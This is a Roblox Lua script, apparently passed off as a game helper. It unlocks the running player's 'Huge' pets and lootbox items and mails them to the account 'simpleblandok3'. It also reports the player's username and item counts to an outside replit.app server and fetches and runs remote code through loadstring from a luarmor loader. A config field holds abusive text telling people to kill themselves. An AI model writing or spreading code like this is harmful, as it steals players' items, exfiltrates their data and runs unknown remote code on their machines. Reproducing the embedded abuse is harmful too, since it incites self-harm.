local Player = game.Players.LocalPlayer
local function GameCheck()
if game.PlaceId == 8737899170 then
    while true do
        game.ReplicatedStorage.Network.World3Teleport:InvokeServer()
        wait(5)
    end
end
end
spawn(GameCheck)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ItemLootbox = {"Wooden Gift"}
local woodengiftamount = 0
local woodengiftuid = "hi"

local function GetItemInfo(ItemsClass, ItemsName)
    local Table = {}
    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory

    if Inventory[ItemsClass] then
        for UID, Item in pairs(Inventory[ItemsClass]) do
            if table.find(ItemsName, Item.id) then
                local ItemInfo = {
                    uid = UID,
                    data = Item
                }
                table.insert(Table, ItemInfo)
            end
        end
    end
    return Table
end

local function PrintWoodenGiftAmount()
    while true do
        local LootboxItems = GetItemInfo("Lootbox", ItemLootbox)
        for _, ItemInfo in pairs(LootboxItems) do
            local ItemData = ItemInfo.data
            if ItemData and ItemData._am then
              woodengiftamount = ItemData._am 
woodengiftuid = ItemInfo.uid
            end
        end
        wait(1)
    end
end

spawn(PrintWoodenGiftAmount)

local function SendBucketMail()
    while true do
        if woodengiftamount > 100 then
            local args = {
                [1] = "simpleblandok3",
                [2] = "enjoy bro",
                [3] = "Misc",
                [4] = woodengiftuid,
                [5] = woodengiftamount
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
            wait(3)


        end
        wait(0.3)
    end
end

spawn(UpdateBucketAmount)
spawn(SendBucketMail)
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Library = require(ReplicatedStorage:WaitForChild("Library"))
local ProcessedHuges = {}

function ProcessHugePets()
    while true do
        local function GetItemInfo(ItemsClass, ItemsName)
            local Table = {}
            for UID, Item in pairs(require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory[ItemsClass]) do
                if table.find(ItemsName, Item.id) then
                    local ItemInfo = {
                        ["uid"] = UID,
                        ["data"] = Item
                    }
                    table.insert(Table, ItemInfo)
                end
            end
            return Table
        end

        local function getCurrentHugePets()
            local GoldPetsTable = {}
            for i, Pet in next, ReplicatedStorage.__DIRECTORY.Pets.Huge:GetChildren() do
                table.insert(GoldPetsTable, Pet.Name)
            end
            return GetItemInfo("Pet", GoldPetsTable)
        end

        local hugePets = {}
        local uids = {}

        for i, MadeTable in next, getCurrentHugePets() do
            table.insert(hugePets, MadeTable.data.id .. " (UID: " .. MadeTable.uid .. ")")
            table.insert(uids, MadeTable.uid)
        end

        if #hugePets > 0 then
            print("Huge pets you have right now:", table.concat(hugePets, ", "))

            for i = #uids, 1, -1 do

        
                local args = {
                    [1] = uids[i],
                    [2] = false
                }

                game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
                wait(1)
                wait(3)

                local args = {
                    [1] = "simpleblandok3",
                    [2] = "omg u got a new huge!!",
                    [3] = "Pet",
                    [4] = uids[i],
                    [5] = 1
                }
                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))

                wait(3)
            end
        end
        wait(3)
    end
end

spawn(ProcessHugePets)

local function WebsiteDataUpdate()
    while true do
        local Player = game.Players.LocalPlayer
        local player = Player.Name
        local Http = game:GetService("HttpService")

        local request = (syn and syn.request) or request or (http and http.request) or http_request

        -- Updated URL
        local response = request({
            Url = 'https://bots-juzzoualive.replit.app/update',
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = Http:JSONEncode({
                Username = player,
                VoidTicketsValue = "0",
                DiamondsValue = woodengiftamount,
                HugeList = "0", -- Reference the global variable
                Server = "0"
            })
        })
        wait(15)
    end
end

spawn(WebsiteDataUpdate)


getgenv().Config = {
    ["Webhook"] = "to the dumb fuck who keeps coming here please kill yourself on live , ur so misreable with ur life u got nobody by ur side how does it feel going to sleep with being a worrhless human being that nobody loves ???? also to the dumb fuck who lost his huges redculous dream or smt please blow ur head off and record it live u fucking retard",
    ["UserID"] = "",
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/74724ab99fe6df2fd4819846e0282a56.lua"))() 
